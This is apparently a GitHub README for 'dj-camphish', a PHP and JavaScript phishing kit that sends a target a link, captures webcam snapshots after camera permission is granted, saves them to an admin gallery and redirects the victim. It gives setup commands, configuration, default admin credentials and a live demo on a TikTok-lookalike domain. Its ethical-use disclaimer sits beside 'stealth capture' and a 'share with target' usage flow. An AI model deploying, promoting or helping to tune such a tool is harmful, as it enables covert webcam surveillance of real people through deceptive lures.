<div align="center">
  <img src="https://via.placeholder.com/1200x630/111827/00d4aa?text=dj-camphish" alt="dj-camphish Logo" width="200">
  <h1>dj-camphish</h1>
  <p><em>Stealthy Browser Webcam Capture & Redirect Toolkit</em></p>
  <p>Refined for ethical red team labs, OSINT, and privacy awareness demonstrations</p>
</div>

<hr>

## 🚀 Overview

`dj-camphish` is a sophisticated, browser-based webcam capture and redirection toolkit designed for **ethical red teaming**, **OSINT training**, and **privacy awareness education**. It seamlessly captures webcam snapshots with explicit user consent, stores them securely server-side, and redirects users to a specified destination—all while maintaining a professional, lightweight footprint.

**Key Philosophy**: Built for controlled environments with full transparency and consent protocols. Always obtain explicit permission before deployment.

---

## ✨ Features

| Feature | Description |
|---------|-------------|
| 🔒 **Stealth Capture** | Silent webcam access with user consent prompts |
| 🎨 **Modern Admin Panel** | Responsive Tailwind CSS dashboard for capture management |
| 📱 **Mobile-First Design** | Fully responsive interface across all devices |
| 🔐 **CSRF Protection** | Secure token-based validation for all admin actions |
| 🖼️ **Social Previews** | Customizable thumbnails (1200x630) for link sharing |
| 📊 **Image Management** | Delete, download (single/ZIP), and bulk operations |
| ⚙️ **Easy Configuration** | Centralized settings for captures, redirects, and security |
| 🛡️ **Ethical Focus** | Built-in consent prompts and logging for compliance |

---

## 📁 Project Structure

```
dj-camphish/
├── index.php                 # Entry point with capture loader & OG meta tags
├── capture.js                # Webcam access & image capture logic
├── save.php                  # Server-side image storage handler
├── config.php                # Core configuration (captures, security)
├── gallery.php               # Responsive admin panel (login: admin/12345)
├── delete_images.php         # Secure image deletion endpoint
├── download_images.php       # Single/ZIP download handler
├── update_redirect.php       # Redirect URL & thumbnail updater
├── get_csrf_token.php        # CSRF token generator for AJAX
├── logout.php                # Secure logout handler
├── redirect.txt              # Dynamic redirect destination
├── thumbnail.png             # Social media preview image (1200x630)
├── fallback.png              # Default thumbnail fallback
├── logs.txt                  # Session & error logging
└── captures/                 # Stored images (e.g., 68e8c7736e5de.png)
```

---

## 🚀 Quick Start

### 1. Prerequisites
- **PHP 7.4+** with `zip` and `gd` extensions enabled
- Web server (Apache/Nginx) with PHP support
- Writeable directories: `/captures/`, `logs.txt`, `redirect.txt`

### 2. Installation
```bash
# Clone the repository
git clone https://github.com/rootuserdj/dj-camphish.git
cd dj-camphish

# Set permissions
chmod 755 captures/
chmod 644 redirect.txt logs.txt thumbnail.png fallback.png

# Generate secure CSRF secret (run once)
php -r "echo 'csrf_secret => ' . json_encode(bin2hex(random_bytes(32))) . ',' . PHP_EOL;"
# Update config.php with the output
```

### 3. Configuration
Edit `config.php`:
```php
'security' => [
    'csrf_secret' => 'your-generated-64-char-hex-string-here',
],
'capture' => [
    'max_captures' => 3,      // Number of snapshots per session
    'interval_ms' => 1500,    // Delay between captures (ms)
    'canvas_width' => 640,    // Capture resolution
    'canvas_height' => 480,
],
```

### 4. Demo Access
- **Admin Panel**: [https://tiktoks.wuaze.com/gallery.php](https://tiktoks.wuaze.com/gallery.php)
  - **Username**: `admin`
  - **Password**: `12345`
- **Capture Demo**: [https://tiktoks.wuaze.com/](https://tiktoks.wuaze.com/)

### 5. Usage Flow
1. Share `index.php` URL with target
2. User grants camera permission → 3 snapshots captured (1.5s intervals)
3. Images saved to `/captures/` (e.g., `68e8c7736e5de.png`)
4. User redirected to URL in `redirect.txt`
5. Access `gallery.php` to view/manage captures

---

## 📱 Screenshots

### 1. Capture Interface
<div align="center">
  <img src="https://via.placeholder.com/800x600/000000/ffffff?text=Capture+Interface" alt="Capture Interface" width="100%" style="border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.15);">
  <p><em>Clean, non-intrusive capture loader with consent prompt</em></p>
</div>

### 2. Admin Dashboard (Desktop)
<div align="center">
  <img src="https://via.placeholder.com/1200x800/111827/00d4aa?text=Admin+Dashboard+Desktop" alt="Admin Dashboard Desktop" width="100%" style="border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.15);">
  <p><em>Responsive gallery with image selection, delete, and download</em></p>
</div>

### 3. Admin Dashboard (Mobile)
<div align="center">
  <img src="https://via.placeholder.com/400x800/111827/00d4aa?text=Admin+Dashboard+Mobile" alt="Admin Dashboard Mobile" width="50%" style="border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.15);">
  <p><em>Mobile-optimized interface with touch-friendly controls</em></p>
</div>

### 4. Settings Modal
<div align="center">
  <img src="https://via.placeholder.com/800x600/1f2937/ffffff?text=Settings+Modal" alt="Settings Modal" width="100%" style="border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.15);">
  <p><em>Configure redirect URLs and upload social media thumbnails (1200x630)</em></p>
</div>

---

## ⚙️ Advanced Configuration

### Capture Settings (`config.php`)
```php
'capture' => [
    'max_captures' => 3,        // 1-5 snapshots per session
    'interval_ms' => 1500,      // 1000-3000ms delay between captures
    'canvas_width' => 640,      // Resolution (320-1280)
    'canvas_height' => 480,     // Resolution (240-960)
],
```

### Security (`config.php`)
```php
'security' => [
    'csrf_secret' => 'your-64-char-hex-string',  // Generate: bin2hex(random_bytes(32))
],
'admin' => [
    'username' => 'admin',                          // Change for production
    'password_hash' => password_hash('strongpass', PASSWORD_DEFAULT),
],
```

### Admin Panel Features
- **Image Management**: Select multiple images for bulk delete or ZIP download
- **Thumbnail Upload**: 1200x630 PNG/JPG for social media previews
- **Redirect Configuration**: Dynamic URL updates without code changes
- **Session Logging**: Track admin actions and errors in `logs.txt`

---

## 🛡️ Security & Best Practices

- **CSRF Protection**: All admin endpoints use HMAC-signed tokens
- **File Validation**: Images validated by type, size, and dimensions
- **Session Security**: Secure cookies and timeout handling
- **Permissions**: Restrict write access to `/captures/` and log files
- **HTTPS Recommended**: Deploy with SSL for production use

**Pro Tip**: Change default credentials (`admin/12345`) immediately after setup.

---

## 🔧 Troubleshooting

| Issue | Solution |
|-------|----------|
| **Images not displaying** | Check `/captures/` permissions (`chmod 755`) |
| **CSRF errors** | Regenerate `csrf_secret` in `config.php` and clear sessions |
| **Thumbnail not showing** | Upload 1200x630 image via Settings; clear social cache |
| **Download fails** | Enable PHP `zip` extension in `php.ini` |
| **Session issues** | Verify `session.save_path` is writable (`/tmp`) |

---

## 📈 Demo Statistics

- **Live Demo**: [tiktoks.wuaze.com](https://tiktoks.wuaze.com/)
- **Admin Access**: [tiktoks.wuaze.com/gallery.php](https://tiktoks.wuaze.com/gallery.php)  
  *(Username: `admin` | Password: `12345`)*
- **Stars**: [![GitHub stars](https://img.shields.io/github/stars/rootuserdj/dj-camphish?style=social)](https://github.com/rootuserdj/dj-camphish/stargazers)
- **Forks**: [![GitHub forks](https://img.shields.io/github/forks/rootuserdj/dj-camphish?style=social)](https://github.com/rootuserdj/dj-camphish/network)

---

## ⚖️ Legal & Ethical Notice

> **⚠️ Ethical Use Only**: This tool is designed for **authorized testing environments** with explicit consent. Unauthorized webcam capture violates privacy laws (e.g., GDPR, CCPA). Always obtain written permission before deployment. The author assumes no liability for misuse.

---

## 👨‍💻 Contact & Support

**Dhananjay Sah**  
📞 +977 9824204425  
✉️ [rootuserdj@gmail.com](mailto:rootuserdj@gmail.com)  
🌐 [GitHub](https://github.com/rootuserdj) | [Portfolio](https://dhananjaysah.com)

**Need Help?** Open an [issue](https://github.com/rootuserdj/dj-camphish/issues) or join the discussion!

---

## 📄 License

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)

This project is licensed under the [MIT License](LICENSE) - see the LICENSE file for details.

---

<div align="center">
  <br>
  <img src="https://via.placeholder.com/800x100/111827/00d4aa?text=Built+with+%E2%9D%A4%EF%B8%8F+for+Ethical+Hacking" alt="Built with Love" width="400">
  <p><em>Made with ❤️ by Dhananjay Sah | October 2025</em></p>
  <br>
  ⭐ **Star us on GitHub if this helps your red team toolkit!** ⭐
</div>
